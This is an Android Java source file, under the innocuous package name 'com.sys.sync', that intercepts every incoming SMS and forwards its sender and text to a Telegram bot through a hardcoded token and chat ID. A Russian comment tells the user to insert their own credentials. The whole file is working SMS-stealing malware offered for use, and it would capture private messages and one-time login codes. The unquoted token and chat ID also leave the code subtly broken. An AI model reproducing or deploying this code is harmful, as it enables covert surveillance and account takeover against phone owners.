package com.sys.sync;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String msg = "SMS от: " + sms.getOriginatingAddress() + "\n" + sms.getMessageBody();
                    new Thread(() -> send(msg)).start();
                }
            }
        }
    }

    private void send(String text) {
        try {
            // ВСТАВЬ СВОИ ДАННЫЕ ТУТ
            String token = 8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8; 
            String chatId = 5225064014;
            
            URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            String data = "{\"chat_id\": \"" + chatId + "\", \"text\": \"" + text + "\"}";
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(data.getBytes("utf-8"));
            }
            conn.getResponseCode();
        } catch (Exception e) { e.printStackTrace(); }
    }
}
